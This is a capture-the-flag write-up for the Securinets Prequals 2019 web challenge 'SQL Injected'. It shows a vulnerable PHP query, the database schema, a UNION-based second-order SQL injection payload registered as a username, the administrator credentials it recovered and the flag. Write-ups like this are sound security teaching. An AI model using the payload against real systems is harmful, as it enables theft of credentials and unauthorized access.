# Securinets Prequals CTF 2019 – SQL Injected

* **Category:** Web
* **Points:** 984

## Challenge

> Task url: https://web5.ctfsecurinets.com 
> 
> You can download the source code [here](public/)
> 
> Author: Oussama
> 
> ps: i don't like the task's name

## Solution

The target is to connect to `https://web5.ctfsecurinets.com/flags.php` with a user having the proper `role` value (i.e. `1`).

Analyzing the source files, a code vulnerable to SQL injection can be spotted into `index.php`.

```php
$sql = "SELECT * FROM posts WHERE author = '". $_SESSION['username'] ."'";
```

The username taken from the session is not properly sanitized. This vulnerability could be triggered via the own username after the authentication.

The database is like the following (based on `create_db.sql`).

```sql
create database webn;
create table users (id int auto_increment primary key, login varchar(100), password varchar(100), role boolean default 0);
create table posts (id int auto_increment primary key, title varchar(50), content text, date Date, author varchar(100));
```

So, a possible malicious input for the username, in order to print the details of the user with the proper role, is the following.

```sql
' UNION SELECT id, login, password, NULL, NULL FROM users WHERE role = 1 AND '' = '
```

A user with this value for the username must be registered. After the first automatic login, the SQL injection will not have effect: you have to logout and re-login in order to find the details of the searched user under the post search section.

```
root
jjLLgTGk3uif2rKBVwqH
```

Logging in with that user and connecting to `https://web5.ctfsecurinets.com/flags.php` will print the flag.

```
Securinets{5VuCj0JUr43jwQDpncRA}
```